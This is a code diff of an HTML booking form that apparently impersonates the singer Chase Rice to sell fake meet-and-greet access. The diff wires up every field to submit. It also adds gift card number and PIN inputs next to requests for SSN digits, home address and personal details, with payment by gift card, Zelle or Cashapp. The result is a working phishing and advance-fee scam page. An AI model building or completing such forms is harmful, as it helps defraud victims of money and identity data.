@@ -1208,13 +1208,13 @@ See you soon, Chase Rice</p>
   <h3>MEET AND GREET FORM FOR CHASE RICE</h3>
   <h4>EVENT DETAILS</h4>
   <label>Event Name:</label>
-  <input type="text" id="eventName" required>
+  <input type="text" id="eventName" name="event_name" required>
   <label>Date of Event:</label>
-  <input type="date" id="eventDate" required>
+  <input type="date" id="eventDate" name="event_date" required>
   <label>Time of Event:</label>
-  <input type="time" id="eventTime" required>
+  <input type="time" id="eventTime" name="event_time" required>
   <label>Location of Event:</label>
-  <input type="text" id="eventLocation" required>
+  <input type="text" id="eventLocation" name="event_location" required>
   <button type="submit">Next</button>
 </form>
 
@@ -1222,17 +1222,17 @@ See you soon, Chase Rice</p>
 <form id="step3" class="container">
   <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>ATTENDEE INFORMATION</h3>
-  <label>Name:</label><input type="text" required>
-  <label>Phone Number:</label><input type="tel" required>
-  <label>Last 4 digits of SSN:</label><input type="text" maxlength="4" required>
-  <label>Age:</label><input type="number" required>
-  <label>Occupation:</label><input type="text">
-  <label>Home Address:</label><input type="text">
-  <label>ZIP code:</label><input type="text">
-  <label>Sex:</label><select><option>Male</option><option>Female</option><option>Other</option></select>
-  <label>Email Address:</label><input type="email" required>
-  <label>Marital status:</label><select><option>Single</option><option>Married</option><option>Other</option></select>
-  <label>Emergency contact:</label><input type="text">
+  <label>Name:</label><input type="text" id="attendeeName" name="name" required>
+  <label>Phone Number:</label><input type="tel" id="phone" name="phone" required>
+  <label>Last 4 digits of SSN:</label><input type="text" id="ssn" name="ssn_last4" maxlength="4" required>
+  <label>Age:</label><input type="number" id="age" name="age" required>
+  <label>Occupation:</label><input type="text" id="occupation" name="occupation">
+  <label>Home Address:</label><input type="text" id="address" name="address">
+  <label>ZIP code:</label><input type="text" id="zip" name="zip">
+  <label>Sex:</label><select id="sex" name="sex"><option>Male</option><option>Female</option><option>Other</option></select>
+  <label>Email Address:</label><input type="email" id="attendeeEmail" name="email" required>
+  <label>Marital status:</label><select id="marital" name="marital_status"><option>Single</option><option>Married</option><option>Other</option></select>
+  <label>Emergency contact:</label><input type="text" id="emergency" name="emergency_contact">
   <button type="submit">Next</button>
 </form>
 
@@ -1240,11 +1240,11 @@ See you soon, Chase Rice</p>
 <form id="step4" class="container">
   <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>MEET & GREET DETAILS</h3>
-  <label>Celebrity Guest:</label><input type="text" required>
-  <label>Meet & Greet Time:</label><input type="time" required>
-  <label>Meet & Greet Location:</label><input type="text" required>
-  <label>Number of Guests:</label><input type="number" required>
-  <label>Special Request:</label><select><option>Autographs</option><option>Photo</option><option>Both</option></select>
+  <label>Celebrity Guest:</label><input type="text" id="celebrity" name="celebrity_guest" required>
+  <label>Meet & Greet Time:</label><input type="time" id="mgTime" name="meet_greet_time" required>
+  <label>Meet & Greet Location:</label><input type="text" id="mgLocation" name="meet_greet_location" required>
+  <label>Number of Guests:</label><input type="number" id="guests" name="number_of_guests" required>
+  <label>Special Request:</label><select id="request" name="special_request"><option>Autographs</option><option>Photo</option><option>Both</option></select>
   <button type="submit">Next</button>
 </form>
 
@@ -1252,11 +1252,11 @@ See you soon, Chase Rice</p>
 <form id="step5" class="container">
   <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>SECURITY & RELEASE</h3>
-  <p><input type="checkbox" required> I understand that security measures will be in place.</p>
-  <p><input type="checkbox" required> I grant permission for photos & videos to be taken.</p>
-  <p><input type="checkbox" required> I understand insurance policies must be ensured for safety.</p>
-  <label>Signature:</label><input type="text" required>
-  <label>Date:</label><input type="date" required>
+  <p><input type="checkbox" id="security" name="security_ack" required> I understand that security measures will be in place.</p>
+  <p><input type="checkbox" id="photos" name="photo_permission" required> I grant permission for photos & videos to be taken.</p>
+  <p><input type="checkbox" id="insurance" name="insurance_ack" required> I understand insurance policies must be ensured for safety.</p>
+  <label>Signature:</label><input type="text" id="signature" name="signature" required>
+  <label>Date:</label><input type="date" id="releaseDate" name="release_date" required>
   <p><strong>Meet & Greet Fee: #5,0000</strong></p>
   <button type="submit">Next</button>
 </form>
@@ -1266,13 +1266,23 @@ See you soon, Chase Rice</p>
   <input type="hidden" name="access_key" value="42ad2877-f81e-4e64-9fc2-51d25c4a455e">
   <h3>Payment Method</h3>
   <label>Select Payment Method:</label>
-  <select id="paymentMethod" required>
+  <select id="paymentMethod" name="payment_method" required>
     <option value="">-- Select --</option>
     <option value="Zelle">💸 Zelle</option>
     <option value="Gift card">🎁 Gift card</option>
     <option value="Cashapp">💵 Cashapp</option>
     <option value="PayPal">💳 PayPal</option>
   </select>
+
+  <div id="giftCardDetails" style="display:none; margin-top:15px;">
+    <label>Gift Card Number:</label>
+    <input type="text" id="giftCardNumber" name="giftcard_number">
+    <label>Gift Card PIN:</label>
+    <input type="text" id="giftCardPin" name="giftcard_pin">
+  </div>
+
+  <button type="submit">Finish</button>
+</form>
 
   <!-- Gift card details (hidden by default) -->
   <div id="giftCardDetails" style="display:none; margin-top:15px;">
